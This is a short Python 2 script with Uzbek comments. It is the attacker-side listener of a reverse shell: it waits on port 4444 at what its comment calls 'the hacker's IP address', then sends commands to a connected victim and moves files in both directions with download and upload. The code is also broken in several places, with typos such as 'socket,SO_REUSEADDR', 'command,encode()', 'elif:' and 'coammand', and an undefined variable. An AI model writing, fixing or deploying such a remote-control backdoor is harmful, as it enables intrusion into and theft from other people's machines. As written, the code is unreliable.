#!/usr/bin/python

import socket
import base64

server_ip = "192.168.43.42"  #hackerning ip adresi
server_port = 4444
xabar_sigimi = 10024

def main():

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket,SO_REUSEADDR, 1)

        adress = (server_ip, server_port)
        server.bind(adress)

        server.listen(5)
        print(" [*] kirib keluvchi bog'lanishlar kuzatilmoqda! [*]")
        klient_soket, klient_adress = server.accept() ## [connection, addes(ip)]

        print("[*] klient  "+ str(klient_adress)+"ip adresiga boglandi ")

        #xabar =" Bu xabarni korayotgan bolsangiz !! demak boglanish muvaffaqiyatli buldi "
        #klient_soket.send(xabar.encode())  ##encode  [atringni byte ga ozgartiradi va aksincha]

	while True:
		command = raw_input(" [*] buyruqni kiriting ! __ ")
		klient_soket.send(command,encode())
		if command == "exit":
			break
		elif command[:8] == "download":

			with open(command[9:], "wb") as fayl:
				fayl_mal = klient_soket.recv(xabar_sigimi*50)
				fayl.write(base64.b64decode(fayl_mal))
				continue

		elif command[:6] == "upload":

			try:
				with open(command[7:], "rb") as fin:
					klient_soket.send(base64.b64encode(fin.read()))
			except:
				print(" [*] upload qilish muvaffaqiyatsz buldi !")
				klient_soket.send(base64.b64encode(failed))
				continue
		elif: command[:2] == "cd" and len(coammand) > 1:
			continue

		natija = klient_soket.recv(xabar_sigimi).decode()
		print(natija)

	klient_soket.close()
	server.close()

main()
